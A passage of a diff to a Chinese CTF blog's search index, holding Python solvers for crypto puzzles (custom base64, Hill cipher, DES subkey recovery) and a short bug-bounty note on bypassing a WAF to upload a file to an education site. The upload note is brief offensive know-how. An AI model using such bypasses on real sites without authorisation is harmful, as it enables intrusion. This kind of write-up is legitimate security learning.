class="hljs-number">46</span>: <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-number">47</span>: <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-number">48</span>: <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-number">49</span>: <span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-number">50</span>: <span class="hljs-string">&#x27;S&#x27;</span>,<br>        <span class="hljs-number">51</span>: <span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-number">52</span>: <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-number">53</span>: <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-number">54</span>: <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-number">55</span>: <span class="hljs-string">&#x27;q&#x27;</span>, <br>        <span class="hljs-number">56</span>: <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-number">57</span>: <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-number">58</span>: <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-number">59</span>: <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-number">60</span>: <span class="hljs-string">&#x27;v&#x27;</span>, <br>        <span class="hljs-number">61</span>: <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-number">62</span>: <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-number">63</span>: <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-number">64</span>: <span class="hljs-string">&#x27;=&#x27;</span><br>        &#125;<br><br>inv_dict = &#123;v : k <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">dict</span>.items()&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">to_bit_stream</span>(<span class="hljs-params">c</span>):</span><br>    res = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:<br>        one = <span class="hljs-built_in">bin</span>(inv_dict[i]).replace(<span class="hljs-string">&#x27;0b&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>        one = (<span class="hljs-number">6</span>-<span class="hljs-built_in">len</span>(one))*<span class="hljs-string">&#x27;0&#x27;</span> + one<br>        res += one<br>    <span class="hljs-keyword">return</span> res    <br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">to_ascii_stream</span>(<span class="hljs-params">s</span>):</span><br>    res = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s),<span class="hljs-number">8</span>):<br>        num = <span class="hljs-built_in">int</span>(s[i:i+<span class="hljs-number">8</span>],<span class="hljs-number">2</span>)<br>        res += <span class="hljs-built_in">chr</span>(num)<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    cipher = <span class="hljs-string">&quot;FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw&quot;</span><br>    <span class="hljs-built_in">print</span>(to_ascii_stream(to_bit_stream(cipher)))<br></code></pre></td></tr></table></figure>
-<h4 id="安洵杯-2019justbase">[安洵杯 2019]JustBase</h4>
-<p>这道题其实猜到用键盘上的<code>!@#$%^&amp;*()</code>来替代<code>123456789</code></p>
-<p>但是顺序没说，如果直接尝试爆破的话，结果会<span class="math inline">\(10!\)</span>种，而且由于<code>base64</code>的容错率比较高，其实最后爆破出来还是要在文本中进一步的筛选（你可以根据部分结果猜出前面那段英文的正确形式，然后全局查找）</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_string</span>(<span class="hljs-params">l</span>):</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(l) == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> [l]<br>    <span class="hljs-keyword">else</span>:<br>        res = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> l:<br>            tmp = get_string(l.replace(i,<span class="hljs-string">&#x27;&#x27;</span>))<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(tmp)):<br>                tmp[j] = i + tmp[j]<br>            res += tmp<br>        <span class="hljs-comment"># print(res)        </span><br>        <span class="hljs-keyword">return</span> res<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_answer</span>(<span class="hljs-params"><span class="hljs-built_in">dict</span></span>):</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;base.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> fin:<br>        data = fin.read()<br>    <br>    tmp = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">dict</span>:<br>            tmp += <span class="hljs-built_in">str</span>(<span class="hljs-built_in">dict</span>.index(i))<br>        <span class="hljs-keyword">else</span>:<br>            tmp += i<br>    <span class="hljs-keyword">try</span>:<br>        res = base64.b64decode(tmp.encode()).decode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(res)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#123;&quot;</span> <span class="hljs-keyword">in</span> res:<br>            <span class="hljs-built_in">print</span>(res)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span><br><br>l = <span class="hljs-string">&quot;@#!)$(%^*&amp;&quot;</span><br><br><span class="hljs-built_in">dict</span> = (get_string(l))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">dict</span>:<br>    get_answer(i)<br><br><span class="hljs-comment"># print(len(get_string(l)))</span><br></code></pre></td></tr></table></figure>
-<p>补充：网上的<code>WP</code>都说可以观察，其实也是正确的，因为你稍微爆破一下会发现这是一段英文，根据<code>base64</code>明文和密文的长度对比（<span class="math inline">\(3\times8 = 4\times6\)</span>），你可以截断部分获取你想要的字符而不影响解码，这样可以大大减少爆破的规模。</p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-        <category>Crypto</category>
-        <category>wp</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>wp</tag>
-        <tag>NSS</tag>
-        <tag>Crypto</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ctfshow-sql注入-wp</title>
     <url>/2022/04/17/blog0015-ctfshow-sql%E6%B3%A8%E5%85%A5-wp/</url>
     <content><![CDATA[<p>终于，在摸鱼混了半年CTF之后，开始向梦开始的地方发起冲击了！</p>
@@ -1144,12 +1100,6 @@ O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"1";s:2:"to";s:10:<strong>"lov
         <tag>ctfshow</tag>
         <tag>SQL注入</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>NSSCTF-单表替换密码-wp</title>
-    <url>/2022/04/28/blog0018-NSSCTF-%E5%8D%95%E8%A1%A8%E6%9B%BF%E6%8D%A2%E5%AF%86%E7%A0%81-wp/</url>
-    <content><![CDATA[
-]]></content>
   </entry>
   <entry>
     <title>SSTI利用总结</title>
@@ -1265,6 +1215,28 @@ O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"1";s:2:"to";s:10:<strong>"lov
       </tags>
   </entry>
   <entry>
+    <title>edusrc首次尝试——任意文件上传</title>
+    <url>/2022/07/11/blog0021-edusrc%E9%A6%96%E6%AC%A1%E5%B0%9D%E8%AF%95%E2%80%94%E2%80%94%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<h2 id="文件上传">1、文件上传</h2>
+<span id="more"></span>
+<p>进入意见反馈/维修报修页面，发现可以存在图片上传控件。</p>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0021/blog0021_0001.jpg" alt="img3" /></p>
+<p>使用bp抓包修改文件名，绕过WAF</p>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0021/blog0021_0002.jpg" alt="img2" /></p>
+<p>访问对应路径，实现文件解析。</p>
+<p>由于是意见反馈和报修页面，因此可以实现XSS等。</p>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0021/blog0021_0003.png" alt="img1" /></p>
+]]></content>
+      <categories>
+        <category>src</category>
+        <category>edu</category>
+      </categories>
+      <tags>
+        <tag>upload</tag>
+        <tag>src</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ctfshow-权限维持-wp</title>
     <url>/2022/07/06/blog0020-ctfshow-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-wp/</url>
     <content><![CDATA[<p>开始学习权限维持啦<br />
@@ -1370,28 +1342,6 @@ O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"1";s:2:"to";s:10:<strong>"lov
       </tags>
   </entry>
   <entry>
-    <title>edusrc首次尝试——任意文件上传</title>
-    <url>/2022/07/11/blog0021-edusrc%E9%A6%96%E6%AC%A1%E5%B0%9D%E8%AF%95%E2%80%94%E2%80%94%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
-    <content><![CDATA[<h2 id="文件上传">1、文件上传</h2>
-<span id="more"></span>
-<p>进入意见反馈/维修报修页面，发现可以存在图片上传控件。</p>
-<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0021/blog0021_0001.jpg" alt="img3" /></p>
-<p>使用bp抓包修改文件名，绕过WAF</p>
-<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0021/blog0021_0002.jpg" alt="img2" /></p>
-<p>访问对应路径，实现文件解析。</p>
-<p>由于是意见反馈和报修页面，因此可以实现XSS等。</p>
-<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0021/blog0021_0003.png" alt="img1" /></p>
-]]></content>
-      <categories>
-        <category>src</category>
-        <category>edu</category>
-      </categories>
-      <tags>
-        <tag>upload</tag>
-        <tag>src</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ctfshow-xxe-wp</title>
     <url>/2022/08/13/blog0023-ctfshow-xxe-wp/</url>
     <content><![CDATA[<p>XXE漏洞开始了</p>
@@ -1449,54 +1399,6 @@ O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"1";s:2:"to";s:10:<strong>"lov
         <tag>wp</tag>
         <tag>ctfshow</tag>
         <tag>XXE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>NSSCTF-Crypto-wp</title>
-    <url>/2022/09/16/blog0024-NSSCTF-Crypto-wp/</url>
-    <content><![CDATA[<p>开启新的篇章，密码学是一直感兴趣的部分，希望不要被折磨得太惨</p>
-<span id="more"></span>
-<h2 id="classical">1、Classical</h2>
-<h3 id="uctf-hill">1、UCTF-Hill</h3>
-<p>这道题打开是一段字母串，结合题目猜测是希尔密码<br />
-<span class="math display">\[\begin{align}
-Am &amp;= c\\
-m  &amp;= A^{-1}c
-\end{align}
-\]</span><br />
-猜测n = 2，于是爆破<span class="math inline">\(A^{-1}\)</span></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> *<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">alpha_to_num</span>(<span class="hljs-params">a</span>):</span><br>    <span class="hljs-keyword">if</span> a.islower():<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">ord</span>(a)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">ord</span>(a)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">num_to_alpha</span>(<span class="hljs-params">num</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) + num)<br><br><span class="hljs-comment"># 此处根据n的大小修改</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">collsion_one_row</span>(<span class="hljs-params">m,c,key,row</span>):</span><br>    <span class="hljs-keyword">for</span> x1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">26</span>):<br>        <span class="hljs-keyword">for</span> x2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">26</span>):<br>            <span class="hljs-keyword">if</span>(<br>                (x1 * c[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] + x2 * c[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]) % <span class="hljs-number">26</span> == m[row][<span class="hljs-number">0</span>] <span class="hljs-keyword">and</span><br>                (x1 * c[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] + x2 * c[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]) % <span class="hljs-number">26</span> == m[row][<span class="hljs-number">1</span>] <span class="hljs-keyword">and</span><br>                (x1 * c[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>] + x2 * c[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>]) % <span class="hljs-number">26</span> == m[row][<span class="hljs-number">2</span>]<br>            ):<br>                key[row][<span class="hljs-number">0</span>] = x1<br>                key[row][<span class="hljs-number">1</span>] = x2 <br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">collsion_key</span>(<span class="hljs-params">m,c,n,key</span>):</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        collsion_one_row(m,c,key,i)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span>(<span class="hljs-params">c,n,key</span>):</span><br>    plain = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(c),n):<br>        ci = np.mat([alpha_to_num(c[i]),alpha_to_num(c[i+<span class="hljs-number">1</span>])]).reshape(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<br>        m = np.matmul(key,ci) % <span class="hljs-number">26</span><br>        plain += num_to_alpha(<span class="hljs-built_in">int</span>(m[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]))<br>        plain += num_to_alpha(<span class="hljs-built_in">int</span>(m[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]))<br>    <span class="hljs-keyword">return</span> plain<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hill_decrypt</span>(<span class="hljs-params">patr_m,cipher</span>):</span><br>    n = <span class="hljs-number">2</span><br><br>    <span class="hljs-comment"># n 为 ncipher的公因数 2,3,4,6,8,12</span><br>    m = np.zeros(<span class="hljs-built_in">len</span>(plain),dtype=<span class="hljs-built_in">int</span>)<br>    c = np.zeros(<span class="hljs-built_in">len</span>(plain),dtype=<span class="hljs-built_in">int</span>)<br><br>    <span class="hljs-comment"># 转换爆破矩阵</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(plain)):<br>        m[i] = alpha_to_num(plain[i])<br>        c[i] = alpha_to_num(cipher[i])<br>    m = m.reshape(<span class="hljs-built_in">len</span>(plain)//n,n).T<br>    c = c.reshape(<span class="hljs-built_in">len</span>(plain)//n,n).T<br><br>    key = np.zeros(n*n,dtype=<span class="hljs-built_in">int</span>).reshape(n,n)<br><br>    <span class="hljs-comment"># 爆破密钥</span><br>    collsion_key(m,c,n,key)<br><br>    <span class="hljs-comment"># 解密</span><br>    <span class="hljs-keyword">return</span> decrypt(cipher,n,key)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:          <br>    cipher = <span class="hljs-string">&quot;wznqca&#123;d4uqop0fk_q1nwofDbzg_eu&#125;&quot;</span><br>    ncipher = <span class="hljs-string">&quot;&quot;</span><br>    l = []<br>    <span class="hljs-keyword">for</span> idx,i <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(cipher):<br>        <span class="hljs-keyword">if</span>(i.isalpha()):<br>            ncipher += i<br>        <span class="hljs-keyword">else</span>:<br>            l.append(idx)<br>    plain = <span class="hljs-string">&quot;utflag&quot;</span><br>    <span class="hljs-built_in">print</span>(hill_decrypt(plain,ncipher))<br></code></pre></td></tr></table></figure>
-<h2 id="des">2、DES</h2>
-<h3 id="nctf-reverse子密钥逆推">1、NCTF-Reverse（子密钥逆推）</h3>
-<p>加密部分非常简单：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pyDes<br>flag = <span class="hljs-string">&quot;NCTF&#123;******************************************&#125;&quot;</span><br>key = os.urandom(<span class="hljs-number">8</span>)<br>d = pyDes.des(key)<br>cipher = d.encrypt(flag.encode())<br><span class="hljs-built_in">print</span>(d.Kn[<span class="hljs-number">10</span>])<br></code></pre></td></tr></table></figure>
-<p>这里给第10轮的密钥，结合密钥生成的过程，我们可以得到如下的逆推逻辑：<br />
-<span class="math display">\[
-\begin{align}
-逆PC2置换(48bit \rightarrow 56bit) \nonumber \\
-逆推位移运算 \nonumber \\
-得到带8位未知数的56bit初始密钥 \nonumber \\
-\end{align}
-\]</span></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_subkey</span>(<span class="hljs-params">key</span>):</span><br>    kbits = str_to_bits(key)<br>    kbits = [kbits[x-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> PC_1]<br>    left = kbits[:<span class="hljs-number">28</span>]<br>    right = kbits[<span class="hljs-number">28</span>:]<br>    subkeys = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ROUNDS):<br>        left = left[R[i]:]+left[:R[i]]<br>        right = right[R[i]:]+right[:R[i]]<br>        cur = left+right<br>        subkeys.append([cur[x-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> PC_2])<br>    <span class="hljs-keyword">if</span> subkeys[<span class="hljs-number">0</span>] == subkeys[<span class="hljs-number">1</span>] <span class="hljs-keyword">or</span> subkeys[<span class="hljs-number">0</span>] == subkeys[<span class="hljs-number">2</span>]:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Boom&quot;</span>)<br>    <span class="hljs-keyword">return</span> subkeys<br></code></pre></td></tr></table></figure>
-<p>对着8位bit做全排列，一共也只有<span class="math inline">\(2^8\)</span>种情况，完全可以爆破</p>
-<p>注意，我们常说DES的密钥为64bit，但是这道题中，我们不需要逆推出剩余的8位校验位，PC_1置换也没必要逆推。</p>
-<p>全排列我用的是回溯法，正好刚考完算法。</p>
-<p>最后代码如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> operator <span class="hljs-keyword">import</span> truediv<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> DES<br><span class="hljs-keyword">import</span> pyDes<br><span class="hljs-keyword">import</span> base64<br><br><br>PC_1 = [<br>        <span class="hljs-number">57</span>, <span class="hljs-number">49</span>, <span class="hljs-number">41</span>, <span class="hljs-number">33</span>, <span class="hljs-number">25</span>, <span class="hljs-number">17</span>,  <span class="hljs-number">9</span>,  <span class="hljs-number">1</span>, <br>        <span class="hljs-number">58</span>, <span class="hljs-number">50</span>, <span class="hljs-number">42</span>, <span class="hljs-number">34</span>, <span class="hljs-number">26</span>, <span class="hljs-number">18</span>, <span class="hljs-number">10</span>,  <span class="hljs-number">2</span>, <br>        <span class="hljs-number">59</span>, <span class="hljs-number">51</span>, <span class="hljs-number">43</span>, <span class="hljs-number">35</span>, <span class="hljs-number">27</span>, <span class="hljs-number">19</span>, <span class="hljs-number">11</span>,  <span class="hljs-number">3</span>,<br>        <span class="hljs-number">60</span>, <span class="hljs-number">52</span>, <span class="hljs-number">44</span>, <span class="hljs-number">36</span>, <span class="hljs-number">63</span>, <span class="hljs-number">55</span>, <span class="hljs-number">47</span>, <span class="hljs-number">39</span>, <br>        <span class="hljs-number">31</span>, <span class="hljs-number">23</span>, <span class="hljs-number">15</span>,  <span class="hljs-number">7</span>, <span class="hljs-number">62</span>, <span class="hljs-number">54</span>, <span class="hljs-number">46</span>, <span class="hljs-number">38</span>, <br>        <span class="hljs-number">30</span>, <span class="hljs-number">22</span>, <span class="hljs-number">14</span>,  <span class="hljs-number">6</span>, <span class="hljs-number">61</span>, <span class="hljs-number">53</span>, <span class="hljs-number">45</span>, <span class="hljs-number">37</span>,<br>        <span class="hljs-number">29</span>, <span class="hljs-number">21</span>, <span class="hljs-number">13</span>,  <span class="hljs-number">5</span>, <span class="hljs-number">28</span>, <span class="hljs-number">20</span>, <span class="hljs-number">12</span>,  <span class="hljs-number">4</span><br>    ]<br><br>PC_2 = [<br>        <span class="hljs-number">14</span>, <span class="hljs-number">17</span>, <span class="hljs-number">11</span>, <span class="hljs-number">24</span>,  <span class="hljs-number">1</span>,  <span class="hljs-number">5</span>,  <span class="hljs-number">3</span>, <span class="hljs-number">28</span>, <br>        <span class="hljs-number">15</span>,  <span class="hljs-number">6</span>, <span class="hljs-number">21</span>, <span class="hljs-number">10</span>, <span class="hljs-number">23</span>, <span class="hljs-number">19</span>, <span class="hljs-number">12</span>,  <span class="hljs-number">4</span>, <br>        <span class="hljs-number">26</span>,  <span class="hljs-number">8</span>, <span class="hljs-number">16</span>,  <span class="hljs-number">7</span>, <span class="hljs-number">27</span>, <span class="hljs-number">20</span>, <span class="hljs-number">13</span>,  <span class="hljs-number">2</span>, <br>        <span class="hljs-number">41</span>, <span class="hljs-number">52</span>, <span class="hljs-number">31</span>, <span class="hljs-number">37</span>, <span class="hljs-number">47</span>, <span class="hljs-number">55</span>, <span class="hljs-number">30</span>, <span class="hljs-number">40</span>, <br>        <span class="hljs-number">51</span>, <span class="hljs-number">45</span>, <span class="hljs-number">33</span>, <span class="hljs-number">48</span>, <span class="hljs-number">44</span>, <span class="hljs-number">49</span>, <span class="hljs-number">39</span>, <span class="hljs-number">56</span>, <br>        <span class="hljs-number">34</span>, <span class="hljs-number">53</span>, <span class="hljs-number">46</span>, <span class="hljs-number">42</span>, <span class="hljs-number">50</span>, <span class="hljs-number">36</span>, <span class="hljs-number">29</span>, <span class="hljs-number">32</span><br>        ]<br><br><br>ROUNDS = <span class="hljs-number">16</span><br><br>R = [<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>]<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">chr_to_bits</span>(<span class="hljs-params">c</span>):</span><br>    res = <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(c))[<span class="hljs-number">2</span>:]<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">list</span>(res.rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>)))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_to_bits</span>(<span class="hljs-params">s</span>):</span><br>    res = []<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>        res.extend(chr_to_bits(c))<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bits_to_chr</span>(<span class="hljs-params">bits</span>):</span><br>    res = <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>, bits)), <span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">chr</span>(res)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bits_to_str</span>(<span class="hljs-params">bits</span>):</span><br>    res = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bits), <span class="hljs-number">8</span>):<br>        res += bits_to_chr(bits[i:i+<span class="hljs-number">8</span>])<br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_subkey</span>(<span class="hljs-params">key</span>):</span><br>    kbits = str_to_bits(key)<br>    kbits = [kbits[x-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> PC_1]<br>    left = kbits[:<span class="hljs-number">28</span>]<br>    right = kbits[<span class="hljs-number">28</span>:]<br>    subkeys = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ROUNDS):<br>        left = left[R[i]:]+left[:R[i]]<br>        right = right[R[i]:]+right[:R[i]]<br>        cur = left+right<br>        subkeys.append([cur[x-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> PC_2])<br>    <span class="hljs-keyword">if</span> subkeys[<span class="hljs-number">0</span>] == subkeys[<span class="hljs-number">1</span>] <span class="hljs-keyword">or</span> subkeys[<span class="hljs-number">0</span>] == subkeys[<span class="hljs-number">2</span>]:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Boom&quot;</span>)<br>    <span class="hljs-keyword">return</span> subkeys<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_nextkey</span>(<span class="hljs-params">first_key</span>):</span><br>    left = first_key[:<span class="hljs-number">28</span>]<br>    right = first_key[<span class="hljs-number">28</span>:]<br>    subkeys = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ROUNDS):  <br>        left = left[R[i]:]+left[:R[i]]<br>        right = right[R[i]:]+right[:R[i]]<br>        cur = left + right<br>        subkeys.append([cur[x-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> PC_2])<br>    <span class="hljs-keyword">if</span> subkeys[<span class="hljs-number">0</span>] == subkeys[<span class="hljs-number">1</span>] <span class="hljs-keyword">or</span> subkeys[<span class="hljs-number">0</span>] == subkeys[<span class="hljs-number">2</span>]:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Boom&quot;</span>)<br>    <span class="hljs-keyword">return</span> subkeys<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rev_subkeys</span>(<span class="hljs-params">kn,<span class="hljs-built_in">round</span></span>):</span><br>    cur = [<span class="hljs-number">2</span>] * <span class="hljs-number">56</span><br><br>    <span class="hljs-comment"># 逆PC2的置换</span><br>    <span class="hljs-comment"># kn[1] = cur[14] --&gt; cur[14] = kn[1]</span><br>    <span class="hljs-keyword">for</span> i,j <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(PC_2):<br>        cur[j-<span class="hljs-number">1</span>] = kn[i]<br>    <br>    left = cur[:<span class="hljs-number">28</span>]<br>    right = cur[<span class="hljs-number">28</span>:]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">round</span> + <span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># 逆位移</span><br>        left = left[<span class="hljs-number">28</span> - R[<span class="hljs-built_in">round</span> - i]:] + left[:<span class="hljs-number">28</span> - R[<span class="hljs-built_in">round</span> - i]]<br>        right = right[<span class="hljs-number">28</span> - R[<span class="hljs-built_in">round</span> - i]:] + right[:<span class="hljs-number">28</span> - R[<span class="hljs-built_in">round</span> - i]]<br><br>    <span class="hljs-keyword">return</span> (left+right)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rec</span>(<span class="hljs-params">index</span>):</span><br>    <span class="hljs-keyword">if</span>(index == <span class="hljs-number">8</span>):<br>        <span class="hljs-keyword">global</span> revkeys<br>        subkeys = gen_nextkey(revkeys)<br>        <span class="hljs-keyword">if</span>(subkeys[<span class="hljs-number">10</span>] == kn10):<br>            d = pyDes.des(<span class="hljs-string">&quot;********&quot;</span>)<br>            d.Kn = subkeys<br>            m = d.decrypt(cipher)<br>            <span 